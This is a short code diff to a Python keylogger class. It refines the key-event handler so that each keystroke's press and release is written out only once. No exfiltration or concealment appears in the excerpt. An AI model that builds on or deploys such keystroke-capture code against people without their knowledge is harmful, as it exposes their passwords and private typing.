@@ -44,14 +44,14 @@ class MainApp:
             return
 
         if key.event_type == "down":
-            if key.scan_code not in self.key_press:
+            if not (key.scan_code in self.key_press):
                 self.key_press.append(key.scan_code)
-            self.write(key)
+                self.write(key)
 
         elif key.event_type == "up":
             if key.scan_code in self.key_press:
                 self.key_press.remove(key.scan_code)
-            self.write(key)
+                self.write(key)
 
     def run(self):
         """Start the keylogger."""
